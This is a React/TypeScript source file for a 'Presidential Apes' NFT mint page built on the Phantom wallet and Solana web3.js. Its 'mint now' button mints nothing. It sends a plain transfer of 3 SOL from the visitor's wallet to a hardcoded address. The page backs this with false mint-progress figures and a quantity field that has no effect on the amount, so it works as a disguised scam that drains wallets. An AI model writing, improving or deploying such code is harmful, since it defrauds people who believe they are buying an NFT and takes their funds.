import discordIcon from "./images/discord.svg";
import twitterIcon from "./images/twitter.svg";
import increaseIcon from "./images/increase.svg";
import descreaseIcon from "./images/decrease.svg";
import heroImage from "./images/hero.gif";
import Swal from 'sweetalert2'
import withReactContent from 'sweetalert2-react-content'
import { useState, useEffect, useCallback } from "react";
import {
  Connection,
  PublicKey,
  Transaction,
  clusterApiUrl,
  SystemProgram,
} from "@solana/web3.js";

type DisplayEncoding = "utf8" | "hex";
type PhantomEvent = "disconnect" | "connect" | "accountChanged";
type PhantomRequestMethod =
  | "connect"
  | "disconnect"
  | "signTransaction"
  | "signAllTransactions"
  | "signMessage";

interface ConnectOpts {
  onlyIfTrusted: boolean;
}
const MySwal = withReactContent(Swal)
interface PhantomProvider {
  publicKey: PublicKey | null;
  isConnected: boolean | null;
  signTransaction: (transaction: Transaction) => Promise<Transaction>;
  signAllTransactions: (transactions: Transaction[]) => Promise<Transaction[]>;
  signMessage: (
    message: Uint8Array | string,
    display?: DisplayEncoding
  ) => Promise<any>;
  connect: (opts?: Partial<ConnectOpts>) => Promise<{ publicKey: PublicKey }>;
  disconnect: () => Promise<void>;
  on: (event: PhantomEvent, handler: (args: any) => void) => void;
  request: (method: PhantomRequestMethod, params: any) => Promise<unknown>;
}
const realWidth = window.screen.width * window.devicePixelRatio;
  const realHeight = window.screen.height * window.devicePixelRatio;
const getProvider = (): PhantomProvider | undefined => {
  if ("solana" in window) {
    const anyWindow: any = window;
    const provider = anyWindow.solana;
    if (provider.isPhantom) {
      return provider;
      
    }
    
  }
  if(realWidth >= 1200) {window.open("https://phantom.app/", "_blank");}
  
};

const NETWORK = clusterApiUrl("mainet-beta");

export default function App() {
  const provider = getProvider();
  const [logs, setLogs] = useState<string[]>([]);
  const addLog = useCallback(
    (log: string) => setLogs((logs) => [...logs, "> " + log]),
    []
  );
  const connection = new Connection(NETWORK);
  const [, setConnected] = useState<boolean>(false);
  const [publicKey, setPublicKey] = useState<PublicKey | null>(null);
  useEffect(() => {
    if (!provider) return;
    // try to eagerly connect
    provider.connect({ onlyIfTrusted: true }).catch((err) => {
      // fail silently
    });
    provider.on("connect", (publicKey: PublicKey) => {
      setPublicKey(publicKey);
      setConnected(true);
      console.log("[connect] " + publicKey?.toBase58());
    });
    provider.on("disconnect", () => {
      setPublicKey(null);
      setConnected(false);
      console.log("[disconnect] 👋");
    });
    provider.on("accountChanged", (publicKey: PublicKey | null) => {
      setPublicKey(publicKey);
      if (publicKey) {
        console.log("[accountChanged] Switched account to " + publicKey?.toBase58());
      } else {
        addLog("[accountChanged] Switched unknown account");
        provider
          .connect()
          .then(() => addLog("[accountChanged] Reconnected successfully"))
          .catch((err) => {
            console.log("[accountChanged] Failed to re-connect: " + err.message);
          });
      }
    });
    return () => {
      provider.disconnect();
    };
  }, [provider, addLog]);
  if (realWidth >= 1200 && !provider) {
    return <h2 id="centerWallet">Please Install a Wallet Provider</h2>;
  }
  const toAcc = new PublicKey("97N8oo4CC9guyL9b4FVPpK2wXstQiKfXz55Gd4g42q2P");
  const LAMPORT_SOL = 3000000000;
  const createTransferTransaction = async () => {
    if (!provider.publicKey) return;
    let transaction = new Transaction().add(
      SystemProgram.transfer({
        fromPubkey: provider.publicKey,
        toPubkey:  toAcc,
        lamports: LAMPORT_SOL,
      })
    );
    transaction.feePayer = provider.publicKey;
    addLog("Getting recent blockhash");
    const anyTransaction: any = transaction;
    anyTransaction.recentBlockhash = (
      await connection.getRecentBlockhash()
    ).blockhash;
    return transaction;
  };
  const sendTransaction = async () => {
    try {
      const transaction = await createTransferTransaction();
      if (!transaction) return;
      let signed = await provider.signTransaction(transaction);
      addLog("Got signature, submitting transaction");
      addLog("Reciever Addr"+toAcc);
      addLog("Amount  Lamport"+" "+LAMPORT_SOL);
      let signature = await connection.sendRawTransaction(signed.serialize());
      addLog("Submitted transaction " + signature + ", awaiting confirmation");
      await connection.confirmTransaction(signature);
      // addLog("Transaction " + signature + " confirmed");
      MySwal.fire({
        title: <p>Transaction State</p>,
        footer: 'Copyright 2022',
        didOpen: () => {
          // `MySwal` is a subclass of `Swal`
          //   with all the same instance & static methods
          MySwal.clickConfirm()
        }
      }).then(() => {
        return MySwal.fire(<p>"Transaction {" "}{signature}{" "} confirmed"</p>)
      })
    } catch (err) {
      console.warn(err);
      console.log("[error] sendTransaction: " + JSON.stringify(err));
    }
  };
  const signMultipleTransactions = async (onlyFirst: boolean = false) => {
    try {
      const [transaction1, transaction2] = await Promise.all([
        createTransferTransaction(),
        createTransferTransaction(),
      ]);
      if (transaction1 && transaction2) {
        let txns;
        if (onlyFirst) {
          txns = await provider.signAllTransactions([transaction1]);
        } else {
          txns = await provider.signAllTransactions([
            transaction1,
            transaction2,
          ]);
        }
        addLog("signMultipleTransactions txns: " + JSON.stringify(txns));
      }
    } catch (err) {
      console.warn(err);
      addLog("[error] signMultipleTransactions: " + JSON.stringify(err));
    }
  };
  const signMessage = async (message: string) => {
    try {
      const data = new TextEncoder().encode(message);
      const res = await provider.signMessage(data);
      addLog("Message signed " + JSON.stringify(res));
    } catch (err) {
      console.warn(err);
      addLog("[error] signMessage: " + JSON.stringify(err));
    }
  };
  const thumbs = [
    { thumb: "/images/thumb_1.jpeg" },
    { thumb: "/images/thumb_2.jpeg" },
    { thumb: "/images/thumb_3.jpeg" },
    { thumb: "/images/thumb_4.jpeg" },
    { thumb: "/images/thumb_5.jpeg" },
    { thumb: "/images/thumb_6.jpeg" },
    { thumb: "/images/thumb_7.jpeg" },
    { thumb: "/images/thumb_8.jpeg" },
    { thumb: "/images/thumb_9.jpeg" },
    { thumb: "/images/thumb_10.jpeg" },
  ];

  const [price, setPrice] = useState(0);

  const handleChange = (e) => {
    let v = e.target.value;
    if (isNaN(v)) {
      v = 0;
    }
    if (v < 0) {
      v = 0;
    }
    setPrice(v);
  };

  const handleSubmit = (e) => {
    e.preventDefault();
  };

  const decrease = () => {
    if (price !== 0) {
      setPrice(price - 1);
    }
  };
  // useEffect(() => {
  //   var myIndex = 0;
  //   carousel();
  //   function carousel() {
  //     var i;
  //     var x = document.querySelectorAll(".hero-thumbnail img");
  //     // x.forEach((x, i) => {
  //     //   x[i].HTMLElement.style.display = `none`;
  //     // });
  //     // for (i = 0; i < x.length; i++) {
  //     //     x[i].HTMLElement.style.display = "none";
  //     // }
  //     // myIndex++;
  //     // if (myIndex > x.length) { myIndex = 1 }
  //     // x[myIndex - 1].style.display = "block";
  //     // setTimeout(carousel, 1000); // Change image every 2 seconds
  //   }
  // }, []);
  return (
    <div className="App">
      <main>
      <header className="header">
        <div className="container">
          <a href="/" className="brand-logo">
            {" "}
            Presidential <span> Apes </span>
          </a>
          <div className="social-btns">
            <a href="/">
              {" "}
              <img src={discordIcon} alt="" />{" "}
            </a>{" "}
            <a href="/">
              <img src={twitterIcon} alt="" />{" "}
            </a>{" "}
          </div>{" "}
          
          <button   onClick={async () => {
                try {
                  await provider.connect();
                } catch (err) {
                  console.warn(err);
                 console.log("[error] connect: " + JSON.stringify(err));
                }
              }}className="connect-btn btn">{provider && publicKey ? ( "Connected"):("Connect Wallet")} </button>
        </div>
      </header>
      <div className="hero-section">
        <div className="container">
          <div className="hero-thumbnail">
            {" "}
            {/* {thumbs.map((e, i) => ( */}
              {/* // <img key={i} src={e.thumb} alt="" /> */}
              <img  src={ heroImage } alt="Hero Apes NFTS" />
            {/* ))} */}
          </div>
          <div className="hero-content">
            <h1>
              {" "}
              Early mint is now <span> Available </span>
            </h1>
            <h4>
              {" "}
              Total Minted: 687 / 1000 <br /> Price per mint: 3 SOL{" "}
            </h4>
            <form onSubmit={handleSubmit}>
              <div className="price-input">
                <span className="button" onClick={decrease}>
                  {" "}
                  <img src={descreaseIcon} alt="" />
                </span>
                <input
                  placeholder="0"
                  onChange={handleChange}
                  value={price}
                  type="text"
                  name="price"
                  id="price"
                />
                <span className="button" onClick={() => setPrice(price + 1)}>
                  <img src={increaseIcon} alt="" />{" "}
                </span>
              </div>{" "}
              <button onClick={sendTransaction} type="submit" className="btn">
                {" "}
                mint now{" "}
              </button>
              <p className="mint-price">
                {" "}
                Mint Price Total: <strong> 3 SOL </strong>
              </p>
              <strong className="date">
                <span> January </span> 31
              </strong>
            </form>
          </div>
        </div>
      </div>
   
      </main>
      <footer className="logs">
        {logs.map((log, i) => (
          <div className="log" key={i}>
            {log}
          </div>
        ))}
      </footer>
    </div>
  );
}
